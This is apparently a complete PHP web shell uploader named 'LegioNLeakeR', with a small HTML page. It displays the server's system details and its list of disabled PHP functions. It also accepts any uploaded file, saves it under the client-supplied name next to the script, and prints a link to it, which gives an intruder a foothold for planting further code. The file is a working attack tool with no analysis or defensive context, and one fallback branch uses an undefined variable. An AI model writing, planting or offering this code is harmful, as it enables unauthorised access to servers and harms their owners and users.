?><!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LegioNLeakeR</title>
    <style>
        body {
            background-color: #1C1678;
            color: #fff;
            font-family: 'Courier New', Courier, monospace;
        }

        a {
            color: #fff;
        }

        a:visited {
            color: #0f0;
        }

        .s {
            width: 100%;
            margin: 0 auto;
            text-align: center;
        }
    </style>
</head>

<body>
    <div class="s">
        <h1>LegioNLeakeR</h1>
        <p><?= "Uname: " . php_uname(); ?></p>
        <form action="<?= $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
            <input type="file" name="f" class="image">
            <button type="submit">Send</button>
        </form>

    </div>
</body>

</html>
<?php
if(@ini_get('disable_functions')){
    echo "disable_functions: " . @ini_get('disable_functions');
}else{
    echo "No inactive functions found...";
}

if (isset($_FILES['f'])) {
    if (function_exists('copy')) {
        if(@copy($_FILES['f']['tmp_name'], $_FILES['f']['name'])){
            echo "<p>S!</p><p>Filename: " . $_FILES['f']['name'] . "</p> Link: <a href=" . $_FILES['f']['name'] . " target='_blank'>" . $_FILES['f']['name'] . "</a>";
        }else{
            echo "F";
        }
    } elseif (function_exists('move_uploaded_file')) {
        if(@move_uploaded_file($_FILES["f"]["tmp_name"], $f)){
           echo "<p>S!</p>Link: <a href=" . $_FILES['f']['name'] . " target='_blank'>" . $_FILES['f']['name'] . "</a>";
        }else{
            echo "F";
        }
    }  
}  
?>
